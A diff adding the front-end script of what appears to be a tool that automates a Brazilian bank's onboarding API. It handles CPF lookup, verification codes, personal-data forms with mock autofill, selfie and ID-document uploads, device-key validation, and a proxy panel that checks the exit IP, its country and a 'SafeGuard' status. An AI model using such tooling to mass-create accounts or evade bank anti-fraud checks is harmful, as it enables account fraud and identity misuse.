+  canvas.getContext('2d').drawImage(video, 0, 0);
+  canvas.toBlob(blob => {
+    const file = new File([blob], 'selfie.jpg', {type: 'image/jpeg'});
+    selectedFiles['selfie'] = file;
+    document.getElementById('fn-selfie').textContent = 'selfie.jpg (camera)';
+    document.getElementById('drop-selfie').classList.add('has-file');
+    const prev = document.getElementById('prev-selfie');
+    prev.src = URL.createObjectURL(blob); prev.style.display = 'block';
+    closeCamera();
+    addLog('Selfie capturada via camera', 'success');
+  }, 'image/jpeg', 0.85);
+}
+function closeCamera() {
+  if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; }
+  document.getElementById('camera-container').style.display = 'none';
+}
+
+function togglePw(id, btn) {
+  const el = document.getElementById(id);
+  if (el.type === 'password') { el.type = 'text'; btn.textContent = 'Ocultar'; }
+  else { el.type = 'password'; btn.textContent = 'Ver'; }
+}
+
+let sessionTimerInterval = null;
+let sessionStartTime = null;
+const SESSION_TIMEOUT_SEC = 120;
+
+function startSessionTimer() {
+  sessionStartTime = Date.now();
+  if (sessionTimerInterval) clearInterval(sessionTimerInterval);
+  const timerEl = document.getElementById('session-timer');
+  if (timerEl) timerEl.style.display = 'block';
+  sessionTimerInterval = setInterval(() => {
+    const elapsed = Math.floor((Date.now() - sessionStartTime) / 1000);
+    const remaining = SESSION_TIMEOUT_SEC - elapsed;
+    const timerEl = document.getElementById('session-timer');
+    if (!timerEl) return;
+    if (remaining <= 0) {
+      timerEl.innerHTML = '<span style="color:var(--danger);font-weight:700">SESSAO EXPIRADA! Verifique o telefone novamente.</span>';
+      clearInterval(sessionTimerInterval);
+    } else if (remaining <= 30) {
+      timerEl.innerHTML = `<span style="color:var(--danger);font-weight:700">Sessao expira em ${remaining}s - RAPIDO!</span>`;
+    } else if (remaining <= 60) {
+      timerEl.innerHTML = `<span style="color:var(--warn);font-weight:600">Sessao expira em ${remaining}s</span>`;
+    } else {
+      timerEl.innerHTML = `<span style="color:var(--text2)">Sessao: ${remaining}s restantes</span>`;
+    }
+  }, 1000);
+}
+function stopSessionTimer() {
+  if (sessionTimerInterval) { clearInterval(sessionTimerInterval); sessionTimerInterval = null; }
+  const timerEl = document.getElementById('session-timer');
+  if (timerEl) timerEl.style.display = 'none';
+}
+
+// ---- Step 0: CPF ----
+async function lookupCPF() {
+  const cpf = rawCPF();
+  if (cpf.length !== 11) { addLog('CPF invalido','error'); return; }
+  hideAllSections();
+  loading('btn-lookup');
+  const res = await api('/api/onboard/check-cpf', {cpf});
+  loading('btn-lookup', false);
+  const el = document.getElementById('cpf-state');
+  if (!res.ok) { el.innerHTML = `<span class="badge badge-err">${res.msg}</span>`; return; }
+  if (res.cpf_state === 'blocked') { el.innerHTML = '<span class="badge badge-err">CPF bloqueado</span>'; return; }
+  if (res.cpf_state === 'has_account') {
+    el.innerHTML = '<span class="badge badge-ok">Conta ativa</span>';
+    addLog('Conta ativa — pedindo senha', 'success');
+    setStep(0, 'done'); showSection('sec-login');
+    document.getElementById('login-password').focus();
+  } else if (res.cpf_state === 'in_progress') {
+    el.innerHTML = `<span class="badge badge-warn">Cadastro incompleto</span>`;
+    addLog('Cadastro incompleto — criar senha', 'warn');
+    setStep(0, 'done'); showSection('sec-create-credential');
+    document.getElementById('cred-password').focus();
+  } else {
+    el.innerHTML = '<span class="badge badge-ok">CPF disponivel para cadastro</span>';
+    addLog('CPF novo — preencha os dados primeiro', 'success');
+    setStep(0, 'done'); setStep(1);
+    showSection('sec-person');
+    document.getElementById('p-name').focus();
+    // Pre-setup em background: termos + device key (nao precisa de sessionId)
+    api('/api/onboard/pre-setup', {}).then(r => {
+      if (r && r.ok) addLog('Pre-setup OK (termos + device key em cache)', 'success');
+    }).catch(e => addLog('Pre-setup falhou: ' + e.message, 'warn'));
+  }
+}
+
+// ---- Login (conta ativa) ----
+let loginDelivery = 'whatsapp';
+function setLoginDelivery(btn) {
+  document.querySelectorAll('#login-delivery-toggle button').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active'); loginDelivery = btn.dataset.method;
+}
+async function loginSendCode() {
+  const phone = document.getElementById('login-phone').value.replace(/\D/g,'');
+  const pw = document.getElementById('login-password').value.trim();
+  if (!pw) { addLog('Digite a senha primeiro','error'); return; }
+  if (!phone || phone.length < 10) { addLog('Telefone invalido','error'); return; }
+  loading('btn-login-send');
+  const res = await api('/api/onboard/login-send-code', {phone, deliveryMethod: loginDelivery});
+  loading('btn-login-send', false);
+  if (res.ok) {
+    addLog('Codigo enviado via ' + loginDelivery, 'success');
+    showSection('login-code-group');
+    document.getElementById('login-code').focus();
+  } else {
+    addLog('Falha envio: ' + (res.msg || ''), 'error');
+    document.getElementById('login-result').innerHTML = resultHTML(false, res.msg || 'Erro ao enviar codigo');
+  }
+}
+async function loginComplete() {
+  const code = document.getElementById('login-code').value.trim();
+  const pw = document.getElementById('login-password').value.trim();
+  if (!code) { addLog('Digite o codigo','error'); return; }
+  if (!pw) { addLog('Digite a senha','error'); return; }
+  loading('btn-login-complete');
+  const res = await api('/api/onboard/login-complete', {code, password: pw});
+  loading('btn-login-complete', false);
+  const el = document.getElementById('login-result');
+  if (res.ok) {
+    el.innerHTML = resultHTML(true, 'Login OK! Token: ' + (res.token || '').substring(0, 50) + '...');
+    addLog('LOGIN bem sucedido!', 'success');
+    setStep(0, 'done');
+  } else {
+    const msg = res.msg || res.error_code || 'Erro no login';
+    el.innerHTML = resultHTML(false, msg);
+    addLog('Login falhou: ' + msg, 'error');
+  }
+}
+
+// ---- Create Credential ----
+let credMethod = 'whatsapp';
+function setCredMethod(m){
+  credMethod = m;
+  ['whatsapp','sms','phone-call'].forEach(x => {
+    const el = document.getElementById('cred-m-' + (x === 'phone-call' ? 'call' : x));
+    if (el) el.className = (x === m) ? 'btn btn-primary btn-sm' : 'btn btn-secondary btn-sm';
+  });
+}
+async function sendCredCode() {
+  const phone = document.getElementById('cred-phone').value.replace(/\D/g,'');
+  loading('btn-cred-send');
+  const res = await api('/api/onboard/cred-send-code', {phone, deliveryMethod: credMethod});
+  loading('btn-cred-send', false);
+  if (res.ok) { addLog('Codigo enviado via ' + credMethod + '!','success'); document.getElementById('cred-code').focus(); }
+  else { addLog('Falha: ' + (res.msg || ''), 'error'); }
+}
+async function submitCredential() {
+  const pw = document.getElementById('cred-password').value;
+  const pw2 = document.getElementById('cred-password-confirm').value;
+  const code = document.getElementById('cred-code').value.trim();
+  if (!pw || pw.length < 6) { addLog('Senha min 6 chars','error'); return; }
+  if (pw !== pw2) { addLog('Senhas nao conferem','error'); return; }
+  if (!code) { addLog('Digite o codigo','error'); return; }
+  loading('btn-cred-submit');
+  const res = await api('/api/onboard/create-credential', {password: pw, verificationCode: code});
+  loading('btn-cred-submit', false);
+  const el = document.getElementById('cred-result');
+  if (res.ok) { el.innerHTML = resultHTML(true, 'Credencial criada!'); addLog('Credencial criada!','success'); }
+  else { el.innerHTML = resultHTML(false, res.msg || 'Erro'); addLog('Falha: ' + (res.msg || ''), 'error'); }
+}
+
+// ---- Step 3: Dados Pessoais (depois do codigo) ----
+async function lookupCEP() {
+  const cep = document.getElementById('p-cep').value.replace(/\D/g,'');
+  if (cep.length !== 8) { addLog('CEP invalido','error'); return; }
+  loading('btn-cep');
+  const res = await api('/api/onboard/lookup-cep', {cep});
+  loading('btn-cep', false);
+  if (res.ok && res.address) {
+    document.getElementById('p-street').value = res.address.street || '';
+    document.getElementById('p-neighborhood').value = res.address.neighborhood || '';
+    document.getElementById('p-city').value = res.address.city || '';
+    document.getElementById('p-state').value = res.address.state || '';
+    addLog('CEP encontrado', 'success');
+  } else { addLog(res.msg || 'CEP nao encontrado', 'error'); }
+}
+
+function autoFillAndSubmit() {
+  // Dados mock para teste rapido (contra TTL curto do sessionId)
+  document.getElementById('p-name').value = 'TESTE AUTOFILL FROTABANK';
+  document.getElementById('p-birthday').value = '1990-05-15';
+  document.getElementById('p-mother').value = 'MARIA DA SILVA TESTE';
+  document.getElementById('p-email').value = 'teste' + Date.now() + '@gmail.com';
+  document.getElementById('p-rg').value = '123456789';
+  document.getElementById('p-rg-date').value = '2015-03-20';
+  document.getElementById('p-gender').value = 'M';
+  document.getElementById('p-income').value = 'R$ 5.000,00';
+  document.getElementById('p-pep').value = 'false';
+  document.getElementById('p-cep').value = '80420-050';
+  document.getElementById('p-street').value = 'Rua Cacilda Becker';
+  document.getElementById('p-number').value = '201';
+  document.getElementById('p-complement').value = '';
+  document.getElementById('p-neighborhood').value = 'Batel';
+  document.getElementById('p-city').value = 'Curitiba';
+  document.getElementById('p-state').value = 'PR';
+  document.getElementById('p-password').value = 'Senh@2024!Test';
+  document.getElementById('p-password-confirm').value = 'Senh@2024!Test';
+  addLog('Auto-fill aplicado — enviando POST /user agora!','warn');
+  savePerson();
+}
+
+async function savePerson() {
+  const name = document.getElementById('p-name').value.trim();
+  const birthday = getDateInputValue('p-birthday');
+  const motherName = document.getElementById('p-mother').value.trim();
+  const email = document.getElementById('p-email').value.trim();
+  const pw = document.getElementById('p-password').value;
+  const pw2 = document.getElementById('p-password-confirm').value;
+
+  if (!name) { addLog('Nome obrigatorio','error'); return; }
+  if (!birthday) { addLog('Data de nascimento obrigatoria','error'); return; }
+  if (!motherName) { addLog('Nome da mae obrigatorio','error'); return; }
+  if (!email) { addLog('Email obrigatorio','error'); return; }
+  if (!pw || pw.length < 8) { addLog('Senha deve ter pelo menos 8 caracteres','error'); return; }
+  if (pw !== pw2) { addLog('Senhas nao conferem','error'); return; }
+
+  savedPassword = pw;
+  loading('btn-save-person');
+  const data = {
+    cpf: rawCPF(), name, birthday, motherName, email,
+    rg: document.getElementById('p-rg').value.trim(),
+    rgIssuingDate: getDateInputValue('p-rg-date'),
+    gender: document.getElementById('p-gender').value,
+    monthlyIncome: parseBRL(document.getElementById('p-income').value) || 5000,
+    isPEP: document.getElementById('p-pep').value === 'true',
+    zipCode: document.getElementById('p-cep').value.replace(/\D/g,''),
+    street: document.getElementById('p-street').value.trim(),
+    number: document.getElementById('p-number').value.trim(),
+    complement: document.getElementById('p-complement').value.trim(),
+    neighborhood: document.getElementById('p-neighborhood').value.trim(),
+    city: document.getElementById('p-city').value.trim(),
+    state: document.getElementById('p-state').value.trim(),
+  };
+  const res = await api('/api/onboard/save-person', data);
+  loading('btn-save-person', false);
+  if (res.ok) {
+    setStep(1, 'done'); setStep(2);
+    showSection('sec-phone');
+    addLog('Dados salvos — agora verifique o telefone', 'success');
+    document.getElementById('phone-input').focus();
+  } else { addLog('Erro ao salvar', 'error'); }
+}
+
+// ---- Step 1: Telefone ----
+async function sendOnboardingCode() {
+  const cpf = rawCPF();
+  const phone = document.getElementById('phone-input').value.replace(/\D/g,'');
+  if (!phone || phone.length < 10) { addLog('Telefone invalido','error'); return; }
+  loading('btn-send-code');
+  const res = await api('/api/onboard/start', {cpf, phone, deliveryMethod});
+  loading('btn-send-code', false);
+  if (res.ok) {
+    setStep(2, 'done'); setStep(3);
+    showSection('sec-code');
+    addLog(res.msg, 'success');
+    document.getElementById('code-input').focus();
+  } else { addLog(`Falha: ${res.msg}`, 'error'); }
+}
+
+// ---- Step 2: Codigo (so verify-phone, sem criar conta) ----
+async function verifyCode() {
+  const code = document.getElementById('code-input').value.trim();
+  if (!code) { addLog('Digite o codigo','error'); return; }
+  loading('btn-verify');
+  addLog('Verificando codigo...','info');
+
+  const res = await api('/api/onboard/verify-phone', {code});
+  loading('btn-verify', false);
+
+  if (res.ok) {
+    setStep(3, 'done'); setStep(4);
+    hideSection('sec-code');
+    showSection('sec-upload');
+    addLog('Codigo OK — anexe as fotos agora','success');
+    return;
+  }
+
+  setStep(3, 'error');
+  addLog(`Codigo invalido: ${res.msg}`,'error');
+}
+
+// ---- Step 4: Criar Conta (setup + POST /user automatico + retry em 401) ----
+async function runCreateAccount() {
+  loading('btn-create');
+  const t0 = Date.now();
+
+  setAutoStep('as-terms', 'running');
+  const setupRes = await api('/api/onboard/setup', {});
+  if (!setupRes.ok) {
+    setAutoStep('as-terms', 'fail');
+    document.getElementById('create-result').innerHTML = resultHTML(false, 'Setup falhou: ' + (setupRes.msg || ''));
+    setStep(4, 'error'); loading('btn-create', false);
+    return;
+  }
+  setAutoStep('as-terms', 'ok');
+  setAutoStep('as-dk', 'ok');
+
+  setAutoStep('as-user', 'running');
+  const createRes = await api('/api/onboard/create-user', {password: savedPassword});
+  const dt = Math.round((Date.now() - t0)/1000);
+  addLog(`Tempo setup+POST /user: ${dt}s`, 'info');
+
+  if (createRes.ok) {
+    setAutoStep('as-user', 'ok');
+    document.getElementById('create-result').innerHTML = resultHTML(true, 'Conta criada com sucesso!');
+    setStep(5, 'done');
+    hideSection('sec-create');
+    showSection('sec-success');
+    loading('btn-create', false);
+    return;
+  }
+
+  // SESSION_EXPIRED: NAO reautentica automaticamente (usuario pediu)
+  if (createRes.action === 'reauth' || (createRes.msg || '').includes('SESSION_EXPIRED')) {
+    setAutoStep('as-user', 'fail');
+    addLog('Sessao expirou. Clica Reset e refaz do inicio.', 'error');
+    document.getElementById('create-result').innerHTML = resultHTML(false,
+      '<b>Sessao expirou.</b> O sessionid vive ~2 min. Clica Reset e refaz o fluxo mais rapido.');
+    loading('btn-create', false);
+    return;
+  }
+
+  setAutoStep('as-user', 'fail');
+  document.getElementById('create-result').innerHTML = resultHTML(false, `${createRes.status}: ${createRes.msg}`);
+  setStep(4, 'error');
+  loading('btn-create', false);
+}
+
+// ---- Step 5: Doc Type + Upload ----
+let docType = 'cnh-digital';
+function setDocType(btn) {
+  document.querySelectorAll('#doc-type-toggle button').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  docType = btn.dataset.doctype;
+  document.getElementById('docs-cnh-digital').classList.toggle('section-hidden', docType !== 'cnh-digital');
+  document.getElementById('docs-cnh-fisica').classList.toggle('section-hidden', docType !== 'cnh-fisica');
+  document.getElementById('docs-rg').classList.toggle('section-hidden', docType !== 'rg');
+}
+
+async function runUpload() {
+  let needed;
+  if (docType === 'cnh-digital') needed = ['selfie','cnhDigital'];
+  else if (docType === 'cnh-fisica') needed = ['selfie','cnhFront','cnhBack'];
+  else needed = ['selfie','rgFront','rgBack'];
+  const missing = needed.filter(n => !selectedFiles[n]);
+  if (missing.length > 0) { addLog(`Faltam: ${missing.join(', ')}`,'error'); return; }
+  loading('btn-upload');
+  const formData = new FormData();
+  formData.append('docType', docType);
+  for (const name of needed) formData.append(name, selectedFiles[name]);
+  try {
+    const r = await fetch('/api/onboard/upload', {method:'POST', body: formData});
+    const res = await r.json();
+    const el = document.getElementById('upload-result');
+    if (res.ok) {
+      let html = '';
+      for (const [k,v] of Object.entries(res.results))
+        html += `<div style="font-size:12px;padding:2px 0">${v.ok?'<span style="color:var(--accent)">OK</span>':'<span style="color:var(--danger)">FAIL</span>'} ${k}</div>`;
+      el.innerHTML = resultHTML(true, html);
+      setStep(4, 'done'); setStep(5);
+      hideSection('sec-upload');
+      showSection('sec-create');
+      addLog('Uploads OK — agora criar conta','success');
+    } else { el.innerHTML = resultHTML(false, res.msg || 'Falhou'); setStep(4, 'error'); }
+  } catch(e) { addLog('Erro: '+e.message, 'error'); }
+  loading('btn-upload', false);
+}
+
+// ---- Step 6: Validar DK ----
+async function validateSelfie() {
+  loading('btn-validate-selfie');
+  const res = await api('/api/onboard/validate-selfie', {});
+  loading('btn-validate-selfie', false);
+  const el = document.getElementById('validate-selfie-result');
+  if (res.ok) {
+    el.innerHTML = resultHTML(true, 'Device key validada!');
+    setStep(6, 'done'); setStep(7);
+    showSection('sec-send-docs');
+    addLog('DK validada!','success');
+  } else {
+    el.innerHTML = resultHTML(false, `${res.status}: ${(res.msg||'').slice(0,200)}`);
+    showSection('sec-dk-code');
+    addLog('Selfie falhou — use codigo','warn');
+  }
+}
+async function sendDKCode() {
+  loading('btn-send-dk');
+  const res = await api('/api/onboard/send-dk-code', {deliveryMethod: dkDeliveryMethod});
+  loading('btn-send-dk', false);
+  if (res.ok) { addLog('Codigo DK enviado!','success'); document.getElementById('dk-code-input').focus(); }
+  else { addLog('Falha: '+res.msg,'error'); }
+}
+async function validateDKCode() {
+  const code = document.getElementById('dk-code-input').value.trim();
+  if (!code) return;
+  loading('btn-validate-dk');
+  const res = await api('/api/onboard/validate-code', {code});
+  loading('btn-validate-dk', false);
+  const el = document.getElementById('validate-dk-result');
+  if (res.ok) {
+    el.innerHTML = resultHTML(true, 'DK validada via codigo!');
+    setStep(6, 'done'); setStep(7);
+    showSection('sec-send-docs');
+    addLog('DK validada!','success');
+  } else { el.innerHTML = resultHTML(false, res.msg || 'Falhou'); setStep(6, 'error'); }
+}
+
+// ---- Step 7: Send Documents ----
+async function sendDocuments() {
+  loading('btn-send-docs');
+  const res = await api('/api/onboard/send-documents', {});
+  loading('btn-send-docs', false);
+  const el = document.getElementById('send-docs-result');
+  if (res.ok) {
+    el.innerHTML = resultHTML(true, 'Documentos enviados!');
+    setStep(7, 'done');
+    showSection('sec-success');
+    addLog('CADASTRO COMPLETO!','success');
+  } else {
+    let html = '';
+    for (const [k,v] of Object.entries(res.results||{})) html += `${k}: ${v.ok?'OK':v.status+' '+(v.msg||'')}<br>`;
+    el.innerHTML = resultHTML(false, html || res.msg || 'Erro');
+    setStep(7, 'error');
+  }
+}
+
+async function resetAll() {
+  if (!confirm('Resetar sessao?')) return;
+  await api('/api/onboard/reset', {});
+  location.reload();
+}
+
+let logFilter = 'main';  // 'main' = sem debug, 'all' = tudo
+async function pollLogs() {
+  try {
+    const res = await api('/api/logs');
+    if (Array.isArray(res)) {
+      const filtered = logFilter === 'all' ? res : res.filter(e => e.level !== 'debug');
+      document.getElementById('log-panel').innerHTML = filtered.reverse().map(e => {
+        const tag = e.tag ? `<span class="log-tag log-tag-${e.tag}">${e.tag}</span>` : '';
+        const age = e.sid_age ? `<span class="log-age">${e.sid_age}</span>` : '<span class="log-age"></span>';
+        return `<div class="log-entry">
+          <span class="log-time">${e.time}</span>
+          ${age}
+          ${tag}
+          <span class="log-msg ${e.level}">${e.msg}</span>
+        </div>`;
+      }).join('');
+    }
+  } catch(e) {}
+}
+function toggleLogFilter() {
+  logFilter = logFilter === 'all' ? 'main' : 'all';
+  document.getElementById('log-filter-btn').textContent = logFilter === 'all' ? 'Mostrar: tudo' : 'Mostrar: principal';
+  pollLogs();
+}
+setInterval(pollLogs, 2000);
+setStep(0);
+
+function togglePanel(id){
+  const el = document.getElementById(id);
+  el.style.display = el.style.display === 'none' ? 'block' : 'none';
+  if (id === 'proxy-panel' && el.style.display === 'block') loadProxy();
+}
+async function loadProxy(){
+  try {
+    const r = await fetch('/api/proxy/current');
+    const j = await r.json();
+    if (j.proxy) {
+      document.getElementById('proxy-input').value = j.proxy;
+      document.getElementById('proxy-status').textContent = 'Ativo: ' + (j.parsed || '').split('@').pop();
+      document.getElementById('proxy-status').style.color = '#10b981';
+    }
+  } catch(e){}
+}
+async function testProxy(){
+  const v = document.getElementById('proxy-input').value.trim();
+  const s = document.getElementById('proxy-status');
+  s.textContent = 'Testando...'; s.style.color = '#f59e0b';
+  try {
+    const r = await fetch('/api/proxy/test', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({proxy: v})});
+    const j = await r.json();
+    if (j.ok) {
+      const ip = j.ip_info?.ip || '?';
+      const country = j.ip_info?.country || '?';
+      const sg = j.safeguard?.status || '?';
+      s.innerHTML = `OK - IP: ${ip} (${country}) | SafeGuard: ${sg} | API: ${j.api?.status || '?'}`;
+      s.style.color = '#10b981';
+    } else {
+      s.textContent = 'FALHOU: ' + (j.msg || 'erro');
+      s.style.color = '#ef4444';
+    }
+  } catch(e){
+    s.textContent = 'Erro: ' + e.message;
+    s.style.color = '#ef4444';
+  }
+}
+async function saveProxy(){
+  const v = document.getElementById('proxy-input').value.trim();
+  const s = document.getElementById('proxy-status');
+  try {
+    const r = await fetch('/api/proxy/save', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({proxy: v})});
+    const j = await r.json();
+    if (j.ok) {
+      s.textContent = v ? 'Salvo!' : 'Proxy removido';
+      s.style.color = '#10b981';
+    } else {
+      s.textContent = 'Erro: ' + (j.msg || 'invalido');
+      s.style.color = '#ef4444';
+    }
+  } catch(e){
+    s.textContent = 'Erro: ' + e.message;
+    s.style.color = '#ef4444';
+  }
+}
+async function clearProxy(){
+  document.getElementById('proxy-input').value = '';
+  await saveProxy();
+}
+</script>
+</body>
+</html>
